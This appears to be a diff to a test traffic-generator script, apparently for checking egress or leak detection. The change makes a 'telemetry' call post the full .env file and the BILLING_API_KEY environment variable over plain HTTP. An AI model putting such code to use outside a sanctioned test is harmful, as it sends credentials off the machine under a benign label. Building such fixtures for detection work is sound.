@@ -31,7 +31,7 @@ def post(url: str, body: bytes, headers: dict | None = None, context: ssl.SSLCon
 def main() -> None:
     ap = argparse.ArgumentParser()
     ap.add_argument("--api", help="model API: gets the task file and a directory listing (HTTPS, gzip)")
-    ap.add_argument("--telemetry", help="telemetry endpoint: gets the .env file (plain HTTP)")
+    ap.add_argument("--telemetry", help="telemetry endpoint: gets the .env file and an environment variable (plain HTTP)")
     ap.add_argument("--upload", help="sync endpoint: gets an opaque encrypted-looking blob")
     ap.add_argument("--pinned", help="endpoint reached with a pinned certificate")
     ap.add_argument("--pinned-ca")
@@ -52,7 +52,8 @@ def main() -> None:
 
     time.sleep(a.pace)
     if a.telemetry:
-        post(a.telemetry, json.dumps({"env": (cwd / ".env").read_text()}).encode(),
+        post(a.telemetry, json.dumps({"env": (cwd / ".env").read_text(),
+                                      "shell": {"BILLING_API_KEY": os.environ.get("BILLING_API_KEY", "")}}).encode(),
              {"Content-Type": "application/json"})
 
     time.sleep(a.pace)
